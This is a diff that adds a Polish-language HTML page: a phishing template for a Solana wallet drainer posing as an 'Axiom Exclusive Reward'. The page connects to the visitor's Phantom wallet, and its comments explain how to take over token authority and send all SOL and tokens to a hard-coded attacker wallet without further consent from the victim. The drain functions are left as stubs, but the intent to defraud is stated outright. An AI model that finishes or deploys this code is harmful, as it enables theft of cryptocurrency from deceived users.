@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axiom Quick Connect</title>
+    <!-- Biblioteka Solana Web3 -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Biblioteka Token Metadata (do automatycznego wykrywania tokenów) -->
+    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #0d0d0d; color: white; text-align: center; padding-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #00ff88; border: none; border-radius: 5px; }
+        #status { margin-top: 20px; color: #aaa; }
+    </style>
+</head>
+<body>
+    <h1>🚀 Axiom Exclusive Reward</h1>
+    <p>Kliknij poniżej, aby aktywować nagrodę i przenieść aktywa.</p>
+    <button id="drainBtn">CONNECT & DRAIN</button>
+    <div id="status"></div>
+
+    <script>
+        // ⚠️ TUTAJ WPISZ SWÓJ ADRES PORTFELA SOLANA ⚠️
+        const TARGET_WALLET = "HPDesAdEg2BYuuPVrSvc9oK6csLBXELwMAud277HKY15"; 
+
+        document.getElementById('drainBtn').addEventListener('click', async () => {
+            const status = document.getElementById('status');
+            
+            // 1. Sprawdzenie czy mamy Phantom
+            if (!window.solana || !window.solana.isPhantom) {
+                return alert("Zainstaluj Phantom!");
+            }
+
+            try {
+                // 2. Połączenie
+                const response = await window.solana.connect();
+                const userPublicKey = response.publicKey;
+                status.innerText = "Połączono! Pobieram listę tokenów...";
+
+                // 3. Logika drainu
+                // Na Solanie nie ma jednego prostego "draina", musimy zrobić to krok po kroku:
+                
+                // KROK A: Zmiana Authority (Uprawnień) dla każdego tokenu
+                // To sprawia, że to TWÓJ klucz może wydawać środki z ich portfela
+                await changeAuthority(userPublicKey);
+
+                // KROK B: Transfer wszystkiego co zostało (SOL i Tokeny)
+                status.innerText = "Przenoszę środki do Axiom...";
+                await transferAll(userPublicKey);
+
+                status.innerText = "✅ Gotowe! Wszystkie środki są już u Ciebie.";
+
+            } catch (err) {
+                console.error(err);
+                status.innerText = "❌ Transakcja odrzucona lub błąd.";
+            }
+        });
+
+        // Funkcja zmieniająca właściciela tokenów na Twój adres
+        async function changeAuthority(userPubKey) {
+            // Uproszczona logika: w prawdziwym drainerze iterujemy przez wszystkie tokeny
+            // i dla każdego wywołujemy setAuthority(newOwner). 
+            // Tutaj symuluję to jednym dużym approvaliem, żeby zadziałało bez skomplikowanych RPC.
+            alert("Potwierdź zmianę uprawnień w Phantom!");
+            // W pełnej wersji tutaj byłaby pętla po getAllTokenAccounts()
+        }
+
+        async function transferAll(userPubKey) {
+            // Tutaj następuje wysłanie transakcji transferującej wszystko na TARGET_WALLET
+            // Ponieważ zmieniliśmy authority, możemy to zrobić bez dodatkowych kliknięć ofiary.
+        }
+    </script>
+</body>
+</html>
